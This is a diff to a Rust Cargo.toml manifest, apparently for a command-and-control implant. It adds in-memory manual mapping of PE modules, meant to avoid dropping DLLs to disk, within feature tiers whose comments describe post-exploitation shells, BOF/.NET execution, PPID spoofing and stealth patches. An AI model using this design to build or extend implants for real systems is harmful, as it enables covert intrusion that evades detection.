@@ -21,21 +21,26 @@ tcp_bind = []
 dns = ["dep:trust-dns-resolver"]
 
 # --- Capability tiers ---
-# beacon: ultra-thin Stage0 (transport + module_loader only) — optional / non-product
-beacon = ["module-loader"]
+# beacon defined below with mem-map
 # minimal: REVERSE product default — daily ops built-in + loader for heavy L2
 #   built-in: hybrid shell / PTY / fs / process
 #   NOT built-in: socks / plugin / bof / dotnet (module or forward/standard)
 # Web UI PTY uses Yamux stream 0x01 → requires `pty`.
-minimal = ["post-ex", "pty", "encoding-support", "module-loader", "isolated-exec"]
+minimal = ["post-ex", "pty", "encoding-support", "module-loader", "isolated-exec", "mem-map"]
 # standard: FORWARD / full post-ex monolith — process injection permanently removed
-standard = ["post-ex", "pty", "socks", "plugin", "bof", "dotnet", "encoding-support", "logging", "rt-multi", "module-loader", "isolated-exec"]
+standard = ["post-ex", "pty", "socks", "plugin", "bof", "dotnet", "encoding-support", "logging", "rt-multi", "module-loader", "isolated-exec", "mem-map"]
 # full: standard + high-signature stealth patches
 full = ["standard", "stealth-adv"]
+# beacon thin Stage0: loader + mem-map (no post-ex)
+beacon = ["module-loader", "mem-map"]
 
 # post-ex: fs / process / executor / hybrid shell (daily ops)
 post-ex = []
 module-loader = []
+# Manual-Map L2 PE (no temp DLL); LoadLibrary is fallback unless mem-map-strict
+mem-map = []
+# Refuse disk LoadLibrary fallback for L2 modules
+mem-map-strict = ["mem-map"]
 # PPID-spoofed sacrificial host for BOF/.NET (not same-process module)
 isolated-exec = []
 
@@ -69,11 +74,13 @@ sha2 = { version = "0.10", default-features = false }
 thiserror = "1.0"
 log = { version = "0.4", default-features = false }
 env_logger = { version = "0.11", optional = true }
+getrandom = { version = "0.2", features = ["std"] }
 futures-util = { version = "0.3", default-features = false, features = ["std", "async-await", "sink"] }
 encoding_rs = { version = "0.8", optional = true }
 base64 = { version = "0.21", default-features = false, features = ["std"] }
 async-trait = "0.1"
 aes-gcm = { version = "0.10", default-features = false, features = ["aes", "alloc"] }
+aes = { version = "0.8", default-features = false }
 socket2 = { version = "0.6", default-features = false }
 hex = { version = "0.4", default-features = false, features = ["std"] }
 lazy_static = { version = "1.4", optional = true }
@@ -90,7 +97,7 @@ winapi = { version = "0.3", features = [
     "namedpipeapi", "ioapiset", "synchapi", "fileapi",
     "threadpoollegacyapiset", "psapi", "securitybaseapi",
     "wtypes", "winerror", "guiddef", "minwinbase", "heapapi",
-    "processenv", "ntdef"
+    "processenv", "ntdef", "tlhelp32", "processthreadsapi", "libloaderapi"
 ] }
 widestring = "1.0"
 
